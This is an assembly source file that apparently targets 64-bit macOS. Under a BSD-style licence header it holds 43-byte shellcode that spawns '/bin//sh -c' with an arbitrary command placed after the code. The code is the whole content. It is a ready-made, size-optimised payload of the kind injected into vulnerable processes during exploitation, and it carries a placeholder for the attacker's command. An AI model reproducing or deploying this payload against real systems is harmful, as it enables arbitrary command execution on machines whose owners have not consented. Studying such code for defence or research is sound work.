;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    
; 43 bytes execute command
;
    bits    64

    push    59
    pop     rax         ; eax = sys_execve
    cdq                 ; edx = 0
    bts     eax, 25     ; eax = 0x0200003B
    mov     rbx, '/bin//sh'
    push    rdx         ; 0
    push    rbx         ; "/bin//sh"
    push    rsp
    pop     rdi         ; rdi="/bin//sh", 0
    ; ---------
    push    rdx         ; 0
    push    word '-c'
    push    rsp
    pop     rbx         ; rbx="-c", 0
    push    rdx         ; argv[3]=NULL
    jmp     l_cmd64
r_cmd64:                ; argv[2]=cmd
    push    rbx         ; argv[1]="-c"
    push    rdi         ; argv[0]="/bin//sh"
    push    rsp
    pop     rsi         ; rsi=argv
    syscall
l_cmd64:
    call    r_cmd64
    ; put your command here followed by null terminator
    